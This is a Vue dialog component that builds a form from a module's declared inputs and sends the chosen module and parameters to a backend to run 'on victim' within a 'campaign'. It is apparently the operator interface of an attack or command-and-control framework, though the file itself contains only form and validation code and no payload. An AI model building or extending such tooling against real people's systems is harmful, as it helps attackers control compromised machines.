<template>
  <Dialog
    v-model:visible="visible"
    :header="'Execute Module: ' + (module?.name || '')"
    :style="{ width: '600px' }"
    modal
    :draggable="false"
  >
    <!-- Module Info -->
    <div class="module-info">
      <p v-if="module?.description" class="module-description">
        {{ module.description }}
      </p>
    </div>

    <Divider />

    <!-- Dynamic Inputs -->
    <div class="module-inputs">
      <div v-for="input in module?.inputs" :key="input.id" class="field">
        <!-- String Input -->
        <template v-if="input.type === 'string'">
          <label :for="`input-${input.id}`">
            {{ input.label }}
            <span v-if="input.required" class="required">*</span>
          </label>
          <InputText
            :id="`input-${input.id}`"
            v-model="params[input.id]"
            :placeholder="input.label"
            :invalid="submitted && input.required && !params[input.id]"
          />
          <small v-if="submitted && input.required && !params[input.id]" class="p-error">
            This field is required
          </small>
        </template>

        <!-- Boolean Input -->
        <template v-else-if="input.type === 'boolean'">
          <div class="field-checkbox">
            <Checkbox
              :id="`input-${input.id}`"
              v-model="params[input.id]"
              :binary="true"
            />
            <label :for="`input-${input.id}`">
              {{ input.label }}
              <span v-if="input.required" class="required">*</span>
            </label>
          </div>
        </template>

        <!-- Number Input -->
        <template v-else-if="input.type === 'number'">
          <label :for="`input-${input.id}`">
            {{ input.label }}
            <span v-if="input.required" class="required">*</span>
          </label>
          <InputNumber
            :id="`input-${input.id}`"
            v-model="params[input.id]"
            :placeholder="input.label"
            :invalid="submitted && input.required && params[input.id] === null"
          />
          <small v-if="submitted && input.required && params[input.id] === null" class="p-error">
            This field is required
          </small>
        </template>

        <!-- Textarea -->
        <template v-else-if="input.type === 'textarea'">
          <label :for="`input-${input.id}`">
            {{ input.label }}
            <span v-if="input.required" class="required">*</span>
          </label>
          <Textarea
            :id="`input-${input.id}`"
            v-model="params[input.id]"
            :placeholder="input.label"
            rows="3"
            :invalid="submitted && input.required && !params[input.id]"
          />
          <small v-if="submitted && input.required && !params[input.id]" class="p-error">
            This field is required
          </small>
        </template>

        <!-- Select -->
        <template v-else-if="input.type === 'select'">
          <label :for="`input-${input.id}`">
            {{ input.label }}
            <span v-if="input.required" class="required">*</span>
          </label>
          <Select
            :id="`input-${input.id}`"
            v-model="params[input.id]"
            :options="input.options || []"
            :placeholder="`Select ${input.label}`"
            :invalid="submitted && input.required && !params[input.id]"
          />
          <small v-if="submitted && input.required && !params[input.id]" class="p-error">
            This field is required
          </small>
        </template>
      </div>
    </div>

    <!-- Error Message -->
    <Message v-if="error" severity="error" :closable="false" class="mt-3">
      {{ error }}
    </Message>

    <!-- Footer -->
    <template #footer>
      <Button
        label="Cancel"
        severity="secondary"
        text
        @click="close"
        :disabled="loading"
      />
      <Button
        label="Execute"
        icon="pi pi-play"
        @click="execute"
        :loading="loading"
      />
    </template>
  </Dialog>
</template>

<script setup>
import { ref, watch, computed } from 'vue'
import { useToast } from 'primevue/usetoast'
import Select from 'primevue/select'
import InputNumber from 'primevue/inputnumber'
import { backendService } from '@/services/backend'

const props = defineProps({
  modelValue: Boolean,
  module: Object,
  campaignId: String,
  victimId: String
})

const emit = defineEmits(['update:modelValue', 'executed'])

const toast = useToast()

const visible = computed({
  get: () => props.modelValue,
  set: (val) => emit('update:modelValue', val)
})

const params = ref({})
const loading = ref(false)
const error = ref(null)
const submitted = ref(false)

// Initialize params when module changes
watch(() => props.module, (newModule) => {
  if (newModule?.inputs) {
    params.value = {}
    submitted.value = false
    error.value = null

    // Initialize with default values
    newModule.inputs.forEach(input => {
      if (input.type === 'boolean') {
        params.value[input.id] = false
      } else if (input.type === 'number') {
        params.value[input.id] = null
      } else {
        params.value[input.id] = ''
      }
    })
  }
}, { immediate: true })

function validateForm() {
  if (!props.module?.inputs) return true

  for (const input of props.module.inputs) {
    if (input.required) {
      const value = params.value[input.id]
      if (value === null || value === undefined || value === '') {
        return false
      }
    }
  }
  return true
}

async function execute() {
  submitted.value = true
  error.value = null

  // Validate
  if (!validateForm()) {
    return
  }

  loading.value = true

  try {
    await backendService.executeModuleOnVictim(
      props.campaignId,
      props.victimId,
      props.module.id,
      params.value
    )

    toast.add({
      severity: 'success',
      summary: 'Module Executed',
      detail: 'Module sent to victim',
      life: 3000
    })

    emit('executed')

    // Delay before closing to allow toast to appear
    setTimeout(() => {
      close()
    }, 500)
  } catch (err) {
    const message = err.message || 'Failed to execute module'
    console.error('❌ Error executing module:', message)
    error.value = message
    toast.add({
      severity: 'error',
      summary: 'Execution Failed',
      detail: message,
      life: 3000
    })
  } finally {
    loading.value = false
  }
}

function close() {
  visible.value = false
  params.value = {}
  error.value = null
  submitted.value = false
}
</script>

<style scoped>
.module-info {
  margin-bottom: 1rem;
}

.module-description {
  color: var(--text-color-secondary);
  font-size: 0.875rem;
  margin: 0;
}

.module-inputs {
  display: flex;
  flex-direction: column;
  gap: 1.25rem;
}

.field {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.field label {
  font-weight: 500;
  color: var(--text-color);
}

.required {
  color: var(--red-500);
  margin-left: 0.25rem;
}

.field-checkbox {
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.field-checkbox label {
  margin: 0;
}

.p-error {
  color: var(--red-500);
  font-size: 0.875rem;
}

.mt-3 {
  margin-top: 1rem;
}
</style>
